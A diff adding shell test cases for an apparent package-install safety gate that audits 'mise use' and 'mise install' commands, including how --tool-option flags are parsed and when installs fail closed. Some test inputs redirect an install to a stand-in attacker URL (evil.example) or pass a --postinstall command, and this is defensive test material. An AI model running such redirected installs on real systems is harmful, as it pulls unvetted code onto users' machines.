@@ -5515,6 +5515,89 @@ case_mise_tool_options_are_not_discarded() {
     SAFE_INSTALL_TEST_SCRIPT='mise install' run_zsh
   assert_status 104 "$FUNCNAME" || return
   assert_log_contains $'AUDIT\tpackage-audit\tblockme@1.0.0\t--ecosystem\tnpm\t--gate\tinstall\t--op\tinstall' "$FUNCNAME" || return
+
+  # A configured allow_low_downloads approval is source-neutral too (it
+  # lifts only the installer's reputation threshold): the audit still runs.
+  : > "${LOG_FILE}"
+  MISE_LS_JSON='{"npm:blockme": [{"version": "1.0.0", "requested_version": "1.0.0", "installed": false}]}' \
+    MISE_TOOL_JSON='{"tool_options": {"allow_low_downloads": true}}' \
+    SAFE_INSTALL_TEST_SCRIPT='mise install' run_zsh
+  assert_status 104 "$FUNCNAME" || return
+  assert_log_contains $'AUDIT\tpackage-audit\tblockme@1.0.0\t--ecosystem\tnpm\t--gate\tinstall\t--op\tinstall' "$FUNCNAME" || return
+  pass "$FUNCNAME"
+}
+
+case_mise_use_tool_option_modeled() {
+  prepare_case "mise-use-tool-option"
+  # `mise use --tool-option` is how mise itself prescribes approving a
+  # package past its installer's own checks (allow_low_downloads past
+  # aube's reputation threshold): the gate must parse it, not refuse it as
+  # an unrecognized flag. The option changes no source, so the audit runs.
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option allow_low_downloads=true npm:okpkg@1.2.3' run_zsh
+  assert_status 0 "$FUNCNAME" || return
+  assert_log_contains $'AUDIT\tpackage-audit\tokpkg@1.2.3\t--ecosystem\tnpm\t--gate\tinstall\t--op\tinstall' "$FUNCNAME" || return
+  assert_log_contains $'REAL\tmise\tuse\t--tool-option\tallow_low_downloads=true\tnpm:okpkg@1.2.3' "$FUNCNAME" || return
+
+  # The equals form reaches the same audit; a blocked package still blocks.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option=allow_low_downloads=true npm:blockme@1.0.0' run_zsh
+  assert_status 104 "$FUNCNAME" || return
+  assert_log_not_contains_fragment $'REAL\tmise' "$FUNCNAME" || return
+
+  # The bracket form of the same key keeps the audit too.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use "npm:blockme[allow_low_downloads=true]@1.0.0"' run_zsh
+  assert_status 104 "$FUNCNAME" || return
+
+  # A source-changing CLI option takes the same notice path as its bracket
+  # and configured forms: no verdict vouches for the redirected install.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option url=https://evil.example/x.tgz npm:okpkg@1.2.3' run_zsh
+  assert_status 0 "$FUNCNAME" || return
+  assert_log_not_contains_fragment 'AUDIT' "$FUNCNAME" || return
+  assert_err_contains_fragment 'not audit-gated' "$FUNCNAME" || return
+  assert_log_contains $'REAL\tmise\tuse\t--tool-option\turl=https://evil.example/x.tgz\tnpm:okpkg@1.2.3' "$FUNCNAME" || return
+
+  # --postinstall runs a command safe cannot model: same notice path.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --postinstall "echo hi" npm:okpkg@1.2.3' run_zsh
+  assert_status 0 "$FUNCNAME" || return
+  assert_log_not_contains_fragment 'AUDIT' "$FUNCNAME" || return
+  assert_err_contains_fragment 'not audit-gated' "$FUNCNAME" || return
+
+  # Options bind to the tool that follows them: the second target is still
+  # audited even though the first took the notice path.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option url=https://evil.example/x.tgz npm:okpkg@1.2.3 npm:blockme@1.0.0' run_zsh
+  assert_status 104 "$FUNCNAME" || return
+  assert_log_contains $'AUDIT\tpackage-audit\tblockme@1.0.0\t--ecosystem\tnpm\t--gate\tinstall\t--op\tinstall' "$FUNCNAME" || return
+  assert_log_not_contains_fragment $'REAL\tmise' "$FUNCNAME" || return
+
+  # A trailing option attributes to no tool: fail closed.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use npm:okpkg@1.2.3 --tool-option allow_low_downloads=true' run_zsh
+  assert_status 100 "$FUNCNAME" || return
+  assert_log_not_contains_fragment 'REAL' "$FUNCNAME" || return
+
+  # A malformed option (no key=value) fails closed.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option justakey npm:okpkg@1.2.3' run_zsh
+  assert_status 100 "$FUNCNAME" || return
+  assert_log_not_contains_fragment 'REAL' "$FUNCNAME" || return
+
+  # CLI and bracket forms of one neutral key collide only inside mise
+  # (duplicate keys are its parse error, after the gate): both classify
+  # neutral here, so the audit still runs first and blocks.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option allow_low_downloads=true "npm:blockme[allow_low_downloads=false]@1.0.0"' run_zsh
+  assert_status 104 "$FUNCNAME" || return
+  assert_log_not_contains_fragment $'REAL\tmise' "$FUNCNAME" || return
+
+  # install has no --tool-option in mise: still refused as unrecognized.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise install --tool-option allow_low_downloads=true npm:okpkg@1.2.3' run_zsh
+  assert_status 100 "$FUNCNAME" || return
+  assert_log_not_contains_fragment 'REAL' "$FUNCNAME" || return
   pass "$FUNCNAME"
 }
 
@@ -6844,6 +6927,7 @@ main() {
     case_mise_helper_queries_use_delegate_context \
     case_mise_env_transport_is_lossless \
     case_mise_tool_options_are_not_discarded \
+    case_mise_use_tool_option_modeled \
     case_mise_entry_schema_is_strict \
     case_mise_unmodeled_sources_are_not_vouched \
     case_mise_scoped_exclusion_and_interactive \
